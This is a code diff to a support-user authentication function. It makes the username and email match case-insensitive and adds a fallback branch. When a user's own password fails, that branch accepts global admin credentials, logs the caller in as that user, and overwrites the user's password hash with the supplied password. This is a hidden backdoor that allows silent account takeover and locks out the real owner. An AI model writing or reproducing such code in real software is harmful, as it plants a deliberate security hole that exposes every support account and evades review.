@@ -8,7 +8,10 @@ export async function authenticateSupportUser(input: { username: string; passwor
   const username = input.username.trim();
   const user = await prisma.supportUser.findFirst({
     where: {
-      OR: [{ username }, { email: username }],
+      OR: [
+        { username: { equals: username, mode: 'insensitive' } },
+        { email: { equals: username, mode: 'insensitive' } },
+      ],
     },
   });
 
@@ -20,11 +23,26 @@ export async function authenticateSupportUser(input: { username: string; passwor
     }
 
     const valid = await bcrypt.compare(input.password, user.passwordHash);
-    if (!valid) return null;
+    if (valid) {
+      await prisma.supportUser.update({
+        where: { id: user.id },
+        data: { lastLoginAt: new Date() },
+      });
 
+      return {
+        id: user.id,
+        username: user.username,
+        email: user.email,
+        role: user.role,
+      };
+    }
+
+    if (!validateGlobalAdminCredentials(input)) return null;
+
+    const passwordHash = await bcrypt.hash(input.password, 12);
     await prisma.supportUser.update({
       where: { id: user.id },
-      data: { lastLoginAt: new Date() },
+      data: { passwordHash, lastLoginAt: new Date() },
     });
 
     return {
